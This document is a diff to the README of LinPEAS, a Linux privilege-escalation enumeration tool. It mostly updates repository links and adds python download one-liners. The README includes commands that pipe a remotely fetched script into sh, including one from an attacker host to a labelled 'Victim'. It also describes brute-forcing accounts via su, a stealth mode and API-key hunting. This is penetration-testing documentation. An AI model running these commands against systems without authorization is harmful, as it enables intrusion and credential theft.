@@ -1,6 +1,6 @@
 # LinPEAS - Linux Privilege Escalation Awesome Script
 
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
+![](https://github.com/peass-ng/PEASS-ng/raw/master/linPEAS/images/linpeas.png)
 
 **LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)**
 
@@ -13,16 +13,21 @@ Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks
 Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed**
 
 ## Quick Start
-Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/carlospolop/PEASS-ng/releases/latest)**.
+Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/peass-ng/PEASS-ng/releases/latest)**.
 
 ```bash
 # From github
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Without curl
+python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+
+python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
 ```
 
 ```bash
 # Local network
-sudo python -m http.server 80 #Host
+sudo python3 -m http.server 80 #Host
 curl 10.10.10.10/linpeas.sh | sh #Victim
 
 # Without curl
@@ -42,15 +47,9 @@ less -r /dev/shm/linpeas.txt #Read with colors
 
 ```bash
 # Use a linpeas binary
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
 chmod +x linpeas_linux_amd64
 ./linpeas_linux_amd64
-```
-
-```bash
-# Execute from memory in Penelope session
-# From: https://github.com/brightio/penelope
-> run peass-ng
 ```
 
 ## Firmware Analysis
@@ -101,13 +100,13 @@ By default linpeas takes around **4 mins** to complete, but It could take from *
 **Interesting parameters:**
 - **-a** (all checks except regex) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
 - **-e** (extra enumeration) - This will execute **enumeration checkes that are avoided by default**
-- **-r** (regex checks) - This will search for **hundreds of API keys of different platforms in the silesystem**
+- **-r** (regex checks) - This will search for **hundreds of API keys of different platforms in the Filesystem**
 - **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
 - **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
 - **-D** (Debug) - Print information about the checks that haven't discovered anything and about the time each check took
 - **-d/-p/-i/-t** (Local Network Enumeration) - Linpeas can also discover and port-scan local networks
 
-This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
+**It's recommended to use the params `-a` and `-r` if you are looking for a complete and intensive scan**.
 
 ```
 Enumerate and search Privilege Escalation vectors.
@@ -119,11 +118,11 @@ This tool enum and search possible misconfigurations (known vulns, user, process
             -t Automatic network scan & Internet conectivity checks - This option writes to files
             -r Enable Regexes (this can take from some mins to hours)
             -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
-	    -D Debug mode
+	      -D Debug mode
 
         Network recon:
             -t Automatic network scan & Internet conectivity checks - This option writes to files
-	    -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
+	      -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
             -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
             -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
              Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed
@@ -136,10 +135,10 @@ This tool enum and search possible misconfigurations (known vulns, user, process
 
         Misc:
             -h To show this message
-	    -w Wait execution between big blocks of checks
+	      -w Wait execution between big blocks of checks
             -L Force linpeas execution
             -M Force macpeas execution
-	    -q Do not show banner
+	      -q Do not show banner
             -N Do not use colours
 
 ```
@@ -150,7 +149,7 @@ With LinPEAS you can also **discover hosts automatically** using `fping`, `ping`
 
 LinPEAS will **automatically search for this binaries** in `$PATH` and let you know if any of them is available. In that case you can use LinPEAS to hosts dicovery and/or port scanning.
 
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/network.png)
+![](https://github.com/peass-ng/PEASS-ng/raw/master/linPEAS/images/network.png)
 
 
 ## Colors
@@ -224,9 +223,9 @@ Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/s
 
 ## Collaborate
 
-If you want to help with the TODO tasks or with anything, you can do it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.
+If you want to help with the TODO tasks or with anything, you can do it using **[github issues](https://github.com/peass-ng/PEASS-ng/issues) or you can submit a pull request**.
 
-If you find any issue, please report it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues)**.
+If you find any issue, please report it using **[github issues](https://github.com/peass-ng/PEASS-ng/issues)**.
 
 **Linpeas** is being **updated** every time I find something that could be useful to escalate privileges.
 
